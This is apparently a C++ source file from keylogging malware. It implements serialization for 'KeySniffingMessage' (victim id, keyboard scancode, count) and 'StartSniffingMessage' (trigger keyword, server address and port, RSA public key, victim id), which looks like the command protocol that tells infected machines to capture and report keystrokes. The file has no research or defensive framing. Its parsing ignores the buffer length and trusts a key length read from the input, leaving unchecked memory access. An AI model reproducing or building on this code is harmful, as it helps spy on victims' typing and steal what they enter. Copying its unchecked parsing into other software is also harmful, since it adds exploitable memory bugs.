#include "common/messages.hpp"

int KeySniffingMessage::Serialize(unsigned char *buf, int length) const
{
    int shift = 0;

    memcpy(buf + shift, (char *)&victim, sizeof(victim));
    shift += sizeof(victim);
    memcpy(buf + shift, (char *)&scancode, sizeof(scancode));
    shift += sizeof(scancode);
    memcpy(buf + shift, (char *)&count, sizeof(count));
    shift += sizeof(count);

    return shift;
}

int KeySniffingMessage::Deserialize(const unsigned char *buf, int length)
{
    int shift = 0;

    victim = *(uint16_t *)&buf[shift];
    shift += sizeof(uint16_t);
    scancode = *(uint16_t *)&buf[shift];
    shift += sizeof(uint16_t);
    count = *(uint32_t *)&buf[shift];
    shift += sizeof(uint32_t);

    return shift;
}

std::string KeySniffingMessage::ToString() const
{
    std::stringstream ss;

    ss << "Victim #" << victim << ": scancode=" << scancode << ", count=" << count;
    return ss.str();
}

int StartSniffingMessage::Serialize(unsigned char *buf, int length) const
{
    int shift;
    unsigned char keybuf[128];
    unsigned long keylen;

    shift = 0;

    memcpy(buf + shift, (char *)keyword, sizeof(keyword));
    shift += sizeof(keyword);

    memcpy(buf + shift, (char *)&server, sizeof(server));
    shift += sizeof(server);
    memcpy(buf + shift, (char *)&port, sizeof(port));
    shift += sizeof(port);

    keylen = sizeof(keybuf);
    if (rsa_export(keybuf, &keylen, PK_PUBLIC, (rsa_key *)&public_key) == -1) {
        return -1;
    }
    memcpy(buf + shift, (char *)&keylen, sizeof(uint32_t));
    shift += sizeof(uint32_t);
    memcpy(buf + shift, (char *)keybuf, keylen);
    shift += keylen;

    memcpy(buf + shift, (char *)&victim, sizeof(victim));
    shift += sizeof(victim);

    return shift;
}

int StartSniffingMessage::Deserialize(const unsigned char *buf, int length)
{
    int shift;
    uint32_t keylen;

    shift = 0;

    memcpy(keyword, buf + shift, sizeof(keyword));
    shift += sizeof(keyword);

    server = *(struct sockaddr_in *)&buf[shift];
    shift += sizeof(struct sockaddr_in);
    port = *(uint16_t *)&buf[shift];
    shift += sizeof(uint16_t);

    keylen = *(uint32_t *)&buf[shift];
    shift += sizeof(uint32_t);

    if (rsa_import((unsigned char *)buf + shift, keylen, &public_key) == -1) {
        return -1;
    }
    shift += keylen;

    victim = *(uint16_t *)&buf[shift];
    shift += sizeof(uint16_t);

    return shift;
}

std::string StartSniffingMessage::ToString() const
{
    std::stringstream ss;

    std::string server_ip(inet_ntoa(server.sin_addr));
    ss << "Keyword: " << keyword << ", server: " << server_ip << ":" << port << ", victim #" << victim;
    return ss.str();
}
